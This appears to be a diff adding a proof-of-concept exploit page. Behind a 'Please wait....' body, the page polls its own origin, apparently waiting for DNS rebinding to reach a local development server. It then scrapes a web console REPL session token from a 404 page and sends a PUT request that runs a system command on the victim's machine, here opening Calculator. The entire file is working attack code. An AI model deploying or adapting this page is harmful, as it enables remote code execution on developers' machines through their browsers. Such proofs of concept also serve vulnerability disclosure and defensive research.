@@ -1,0 +1,36 @@
+<html>
+  <head>
+    <script type="text/javascript">
+     function poll() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", document.location.origin + "/not_found");
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState != 4) {
+            return;
+          }
+
+          if (xhr.status == 404) {
+            var token = xhr.response.match(/console\/repl_sessions\/([^']+)'/)[1];
+
+            var open = new XMLHttpRequest();
+      
+            open.open("PUT", document.location.origin + "/console/repl_sessions/" + token);
+            open.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+            open.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            open.send("input=system(%22open%20%2FApplications%2FCalculator.app%22)");
+          } else {
+            console.log("found normal dns response...");
+            setTimeout(poll, 10 * 1000);
+          }
+        } 
+        xhr.send(null);
+      }
+
+      poll();
+    </script>
+  </head>
+
+  <body>
+    Please wait....
+  </body>
+</html>
